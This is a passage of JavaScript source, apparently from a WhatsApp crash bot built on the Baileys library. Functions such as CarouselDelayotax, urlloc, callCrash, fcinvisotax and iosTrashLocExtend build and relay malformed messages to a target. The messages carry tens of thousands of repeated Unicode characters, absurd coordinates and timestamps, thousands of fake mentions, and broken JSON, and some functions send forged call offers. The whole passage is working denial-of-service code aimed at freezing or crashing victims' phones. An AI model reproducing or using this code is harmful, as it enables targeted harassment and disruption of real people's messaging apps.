JrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsg
                }
            }
        }, {});
        let msg3 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});

        for (let i = 0; i < 1; i++) {
            await otax.relayMessage('status@broadcast', msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });

            await otax.relayMessage('status@broadcast', msg2.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await otax.relayMessage('status@broadcast', msg.message, {
                messageId: msgx.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await otax.relayMessage('status@broadcast', msg2.message, {
                messageId: msgx2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });

            await otax.relayMessage('status@broadcast', msg3.message, {
                messageId: msg3.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            if (i < 9) {
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    } catch (err) {
        console.error(err);
    }
};
async function crashGP(otax, jidx) {
    await otax.relayMessage(jidx, {
        "interactiveMessage": {
            "nativeFlowMessage": {
                "buttons": [
                    {
                        "name": "review_and_pay",
                        "buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"otax\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
                    }
                ]
            }
        }
    }, {});
}
async function CarouselDelayotax(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    for (let i = 0; i < 75; i++) {
        const cards = Array.from({ length: 5 }, () => ({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "otax" + "ꦽ".repeat(5000), }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "otax" + "ꦽ".repeat(5000), }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: "otax" + "ꦽ".repeat(5000),
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                    fileLength: 388944,
                    height: 1600,
                    width: 1200,
                    mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                    fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                    directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1776937541",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
                    contextInfo: {
                        pairedMediaType: "NOT_PAIRED_MEDIA",
                        isQuestion: true,
                        isGroupStatus: true
                    }
                },
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                messageParamsJson: "{[",
                messageVersion: 3,
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: "",
                    },
                    {
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            "icon": "RIVIEW",
                            "flow_cta": "ꦽ".repeat(10000),
                            "flow_message_version": "3"
                        })
                    },
                    {
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            "icon": "RIVIEW",
                            "flow_cta": "ꦾ".repeat(10000),
                            "flow_message_version": "3"
                        })
                    }
                ]
            })
        }));

        const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

        const carousel = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `§otaxUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "ꦽ".repeat(5000),
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: cards
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                messageParamsJson: "{[",
                                messageVersion: 3,
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: "",
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: JSON.stringify({
                                            "icon": "RIVIEW",
                                            "flow_cta": "ꦽ".repeat(10000),
                                            "flow_message_version": "3"
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: JSON.stringify({
                                            "icon": "RIVIEW",
                                            "flow_cta": "ꦾ".repeat(10000),
                                            "flow_message_version": "3"
                                        })
                                    }
                                ]
                            }),
                            contextInfo: {
                                participant: target,
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from(
                                        { length: 1900 },
                                        () =>
                                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                    ),
                                ],
                                remoteJid: "X",
                                participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                stanzaId: "123",
                                quotedMessage: {
                                    paymentInviteMessage: {
                                        serviceType: 3,
                                        expiryTimestamp: Date.now() + 1814400000
                                    },
                                    forwardedAiBotMessageInfo: {
                                        botName: "META AI",
                                        botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                        creatorName: "Bot"
                                    }
                                }
                            },
                        })
                    }
                }
            },
            { userJid: target }
        );
        await otax.relayMessage(target, {
            groupStatusMessageV2: {
                message: carousel.message
            }
        }, { messageId: carousel.key.id });

    }
}
async function crashGroupxx(otax, target) {

    const options = [
        { optionName: "Ota" },
        { optionName: "otax" },
        { optionName: "otaxx" }
    ];

    const correctAnswer = options[1];

    const msg = generateWAMessageFromContent(target, {
        botInvokeMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    messageAssociation: {
                        associationType: 7,
                        parentMessageKey: crypto.randomBytes(16)
                    }
                },
                pollCreationMessage: {
                    name: "otax Here",
                    options: options,
                    selectableOptionsCount: 1,
                    pollType: "QUIZ",
                    correctAnswer: correctAnswer
                }
            }
        }
    }, {});

    await otax.relayMessage(target, msg.message, {
        messageId: otax.generateMessageTag()
    });
}
async function nullotaxx(otax, targetGroupJid) {
    await otax.relayMessage(
        targetGroupJid,
        {
            viewOnceMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "IDR",
                        requestFrom: null,
                        expiryTimestamp: Date.now() + 86400000,
                        noteMessage: null,
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999,
                            forwardedNewsletterMessageInfo: {
                                newsletterName: "otaxUdang",
                                newsletterJid: "1@newsletter"
                            }
                        }
                    }
                }
            }
        },
        { messageId: otax.generateMessageTag() }
    );

    await new Promise(resolve => setTimeout(resolve, 1000));

    try {
        await otax.chatModify(
            {
                archive: true,
                lastMessages: [{
                    key: {
                        remoteJid: targetGroupJid,
                        fromMe: true,
                        id: otax.generateMessageTag()
                    },
                    messageTimestamp: Math.floor(Date.now() / 1000)
                }]
            },
            targetGroupJid
        );
        console.log(`Grup ${targetGroupJid} berhasil diarsipkan`);
    } catch (error) {
        console.error(`Gagal mengarsipkan grup: ${error}`);
    }
}
async function fcinvisotax(otax, target) {

    let baileysLib = null;
    try { baileysLib = require('@whiskeysockets/baileys'); } catch (e1) { try { baileysLib = require('@adiwajshing/baileys'); } catch (e2) { baileysLib = null; } }

    const encodeWAMessageFn = baileysLib?.encodeWAMessage ?? otax.encodeWAMessage?.bind(otax) ?? ((msg) => {
        try { return Buffer.from(JSON.stringify(msg)); } catch (e) { return Buffer.from([]); }
    });

    const encodeSignedDeviceIdentityFn = baileysLib?.encodeSignedDeviceIdentity ?? otax.encodeSignedDeviceIdentity?.bind(otax) ?? null;

    try {
        const jid = String(target).includes("@s.whatsapp.net")
            ? String(target)
            : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

        const janda = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async prev => {
                        try { await prev; } catch { }
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        const javhd = janda();
        const jepang = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        const yntkts = encodeWAMessageFn;

        otax.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

            const patched = await (otax.patchMessageBeforeSending?.(message, recipientJids) ?? message);
            const ywdh = Array.isArray(patched) ? patched : recipientJids.map(j => ({ recipientJid: j, message: patched }));

            const { id: meId, lid: meLid } = otax.authState.creds.me;
            const omak = meLid ? jidDecode(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(ywdh.map(async ({ recipientJid: j, message: msg }) => {
                const { user: targetUser } = jidDecode(j);
                const { user: ownUser } = jidDecode(meId);
                const isOwn = targetUser === ownUser || targetUser === omak;
                const y = j === meId || j === meLid;
                if (dsmMessage && isOwn && !y) msg = dsmMessage;

                const bytes = jepang(yntkts ? yntkts(msg) : Buffer.from([]));
                return javhd.mutex(j, async () => {
                    const { type, ciphertext } = await otax.signalRepository.encryptMessage({ jid: j, data: bytes });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
                    return {
                        tag: "to",
                        attrs: { jid: j },
                        content: [{ tag: "enc", attrs: { v: "2", type, ...extraAttrs }, content: ciphertext }]
                    };
                });
            }));

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let devices = [];
        try {
            devices = (await otax.getUSyncDevices([jid], false, false))
                .map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`);
        } catch {
            devices = [jid];
        }

        try { await otax.assertSessions(devices); } catch { }

        let { nodes: destinations, shouldIncludeDeviceIdentity } = { nodes: [], shouldIncludeDeviceIdentity: false };
        try {
            const created = await otax.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });
            destinations = created?.nodes ?? [];
            shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
        } catch { destinations = []; shouldIncludeDeviceIdentity = false; }

        const otaxkiw = {
            tag: "call",
            attrs: { to: jid, id: otax.generateMessageTag ? otax.generateMessageTag() : crypto.randomBytes(8).toString("hex"), from: otax.user?.id || otax.authState?.creds?.me?.id },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                    "call-creator": otax.user?.id || otax.authState?.creds?.me?.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations }
                ]
            }]
        };

        if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentityFn) {
            try {
                const deviceIdentity = encodeSignedDeviceIdentityFn(otax.authState.creds.account, true);
                otaxkiw.content[0].content.push({ tag: "device-identity", attrs: {}, content: deviceIdentity });
            } catch (e) { }
        }

        await otax.sendNode(otaxkiw);

        return { success: true, target: jid, method: "sendNode" };
    } catch (err) {
        return { success: false, error: err?.message ?? String(err) };
    }
}
async function sendInvisibleCall(otax, target) {
    const crypto = require("crypto");

    const jid = String(target).includes("@s.whatsapp.net")
        ? String(target)
        : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    let baileys = null;
    try { baileys = require("@whiskeysockets/baileys"); }
    catch { try { baileys = require("@adiwajshing/baileys"); } catch { } }

    const encodeMsg =
        baileys?.encodeWAMessage ??
        otax.encodeWAMessage?.bind(otax) ??
        (m => Buffer.from(JSON.stringify(m)));

    const encodeDevId =
        baileys?.encodeSignedDeviceIdentity ??
        otax.encodeSignedDeviceIdentity?.bind(otax);

    let devices = [];
    try {
        devices = (await otax.getUSyncDevices([jid], false, false))
            .map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`);
    } catch {
        devices = [jid];
    }

    try { await otax.assertSessions(devices); } catch { }

    const mutex = (() => {
        const m = {};
        return {
            lock(k, fn) {
                m[k] ??= { p: Promise.resolve() };
                m[k].p = (async x => { try { await x } catch { } return fn() })(m[k].p);
                return m[k].p;
            }
        };
    })();

    otax.createParticipantNodes = async (list, msg, extra) => {
        let include = false;
        const nodes = await Promise.all(list.map(j =>
            mutex.lock(j, async () => {
                const bytes = Buffer.concat([
                    Buffer.from(encodeMsg(msg)),
                    Buffer.alloc(8, 1)
                ]);
                const { type, ciphertext } =
                    await otax.signalRepository.encryptMessage({ jid: j, data: bytes });
                if (type === "pkmsg") include = true;
                return {
                    tag: "to",
                    attrs: { jid: j },
                    content: [{ tag: "enc", attrs: { v: "2", type, ...extra }, content: ciphertext }]
                };
            })
        ));
        return { nodes, shouldIncludeDeviceIdentity: include };
    };

    const { nodes, shouldIncludeDeviceIdentity } =
        await otax.createParticipantNodes(devices, { conversation: "otax" }, { count: "10" });

    const self = otax.user?.id || otax.authState.creds.me.id;

    const callNode = {
        tag: "call",
        attrs: {
            to: jid,
            from: self,
            id: otax.generateMessageTag?.() ?? crypto.randomBytes(8).toString("hex")
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
                "call-creator": self
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", enc: "vp8", dec: "vp8" }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "destination", attrs: {}, content: nodes },
                ...(shouldIncludeDeviceIdentity && encodeDevId
                    ? [{ tag: "device-identity", attrs: {}, content: encodeDevId(otax.authState.creds.account, true) }]
                    : [])
            ]
        }]
    };

    await otax.sendNode(callNode);
}
async function urlloc(client, target) {
    const triggerUI = "ꦾ".repeat(61111);
    await client.relayMessage(
        target,
        {
            locationMessage: {
                degreesLatitude: 99999e99999,
                degreesLongitude: -99999e99999,
                name: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
                inviteLinkGroupTypeV2: "DEFAULT",
                merchantUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                url: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                thumbnailUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                waWebSocketUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                mediaUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                sourceUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                originalImageUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                clickToWhatsappCall: true,
                contextInfo: {
                    remoteJid: `${"@s.whatsapp.net"}`,
                    participant: "13135550002@s.whatsapp.net",
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "CHAT_SETTING"
                    },
                    externalAdReply: {
                        quotedAd: {
                            advertiserName: triggerUI,
                            mediaType: "IMAGE",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                            caption: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
                        },
                        placeholderKey: {
                            remoteJid: "0@s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890"
                        }
                    },
                    mentionedJid: [
                        target,
                        "0@s.whatsapp.net",
                        "13135550002@s.whatsapp.net",
                        ...Array.from(
                            { length: 1990 },
                            () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                    ],
                    stanzaId: client.generateMessageTag(),
                    virtexId: client.generateMessageTag(),
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                    }
                }
            }
        },
        {
            participant: { jid: target }
        }
    );
};

async function callCrash(Yuukey, target) {
    const { jidDecode, jidEncode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
    let devices = (
        await Yuukey.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await Yuukey.assertSessions(devices)

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = Yuukey.createParticipantNodes.bind(Yuukey);
    let yntkts = Yuukey.encodeWAMessage?.bind(Yuukey);

    Yuukey.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (Yuukey.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = Yuukey.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
            let { user: targetUser } = jidDecode(jid);
            let { user: ownPnUser } = jidDecode(meId);
            let isOwnUser = targetUser === ownPnUser || targetUser === omak;
            let y = jid === meId || jid === meLid;
            if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

            let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

            return memek.mutex(jid, async () => {
                let { type, ciphertext } = await Yuukey.signalRepository.encryptMessage({ jid, data: bytes });
                if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                return {
                    tag: 'to',
                    attrs: { jid },
                    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                };
            });
        }));

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
    let { nodes: destinations, shouldIncludeDeviceIdentity } = await Yuukey.createParticipantNodes(devices, { conversation: "7eppeli - Exposed" }, { count: '0' });

    let stanza = {
        tag: "call",
        attrs: { to: target, id: Yuukey.generateMessageTag(), from: Yuukey.user.id },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": Yuukey.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity ? [{
                    tag: "device-identity",
                    attrs: {},
                    content: encodeSignedDeviceIdentity(Yuukey.authState.creds.account, true)
                }] : [])
            ]
        }]
    };

    await Yuukey.sendNode(stanza);
}
async function iosTrashLocExtend(otax, target) {
    const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000);
    try {
        let locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        }

        let extendMsg = {
            extendedTextMessage: {
                text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx,
                matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5